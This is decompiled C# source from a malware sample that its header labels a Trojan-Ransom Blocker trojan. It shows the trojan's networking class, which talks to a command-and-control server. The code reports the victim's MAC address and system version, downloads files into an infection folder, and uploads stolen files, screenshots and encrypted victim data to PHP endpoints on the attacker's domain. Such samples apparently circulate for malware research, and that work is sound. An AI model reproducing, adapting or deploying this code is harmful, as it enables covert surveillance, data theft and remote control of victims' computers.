// Decompiled with JetBrains decompiler
// Type: n3ux.Network
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 807F4FF6-398F-45B5-8EC1-50AF57383C19
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.avxv-c9e0300c4b5a251c76c291f23c0d27537f89d4b9.exe

using System;
using System.Collections.Specialized;
using System.Net;
using System.Web;

namespace n3ux
{
  internal class Network
  {
    public static string Domain = "";
    public static string XML = "";
    public static string MAC = "";

    public static bool Online()
    {
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(Network.Domain);
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        httpWebRequest.Abort();
        return response.StatusCode == HttpStatusCode.OK;
      }
      catch
      {
        return false;
      }
    }

    public static void UpdateState(string systemVersion) => new WebClient().DownloadString(new Uri(Network.Domain + "/actualizarEstadoMaquina.php?m=" + HttpUtility.UrlEncode(Network.MAC) + "&s=" + HttpUtility.UrlEncode(systemVersion)));

    public static string DownloadFile(string url)
    {
      string[] strArray = url.Split('/');
      string str = strArray[strArray.Length - 1];
      string fileName = OS.InfectionPath() + "\\" + str;
      try
      {
        new WebClient().DownloadFile(url, fileName);
      }
      catch
      {
      }
      return fileName;
    }

    public static void SendFile(string path, string command, string uniqueID)
    {
      string base64 = File.ToBase64(path);
      string[] strArray1 = path.Split('.');
      string str = "." + strArray1[strArray1.Length - 1];
      path = path.Replace("/", "\\");
      string[] strArray2 = path.Split('\\');
      NameValueCollection data = new NameValueCollection();
      data.Add("m", Network.MAC);
      data.Add("comando", command);
      data.Add("id", uniqueID);
      data.Add("formato", str);
      data.Add("nombre", strArray2[strArray2.Length - 1].Remove(strArray2[strArray2.Length - 1].IndexOf(str)));
      data.Add("respuesta", base64);
      data.Add("firmaSHA1", Crypto.getSignature(path, "SHA1"));
      data.Add("firmaMD5", Crypto.getSignature(path, "MD5"));
      WebClient webClient = new WebClient();
      webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
      webClient.UploadValues(Network.Domain + "/RecibirArchivo.php", data);
    }

    public static void SendImage()
    {
      NameValueCollection data = new NameValueCollection();
      data.Add("respuesta", OS.CaptureScreen());
      data.Add("maquina", Network.MAC);
      WebClient webClient = new WebClient();
      webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
      webClient.UploadValues(Network.Domain + "/RecibirImagen.php", data);
    }

    public static void SendInformation(
      string info,
      string command,
      string uniqueID,
      int lastPacket)
    {
      info = info.Replace("\\", "\\\\");
      info = info.Replace("á", "&aacute;");
      info = info.Replace("é", "&eacute;");
      info = info.Replace("í", "&iacute;");
      info = info.Replace("ó", "&oacute;");
      info = info.Replace("ú", "&uacute;");
      info = info.Replace("ñ", "&ntilde;");
      if (uniqueID == "")
        uniqueID = "0";
      new WebClient().DownloadString(new Uri(Network.Domain + "/RecibirDatosVictima.php?comando=" + command + "&respuesta=" + HttpUtility.UrlEncode(Crypto.EncryptRijndael(info)) + "&m=" + HttpUtility.UrlEncode(Network.MAC) + "&id=" + HttpUtility.UrlEncode(uniqueID) + "&fin=" + HttpUtility.UrlEncode(lastPacket.ToString())));
    }
  }
}
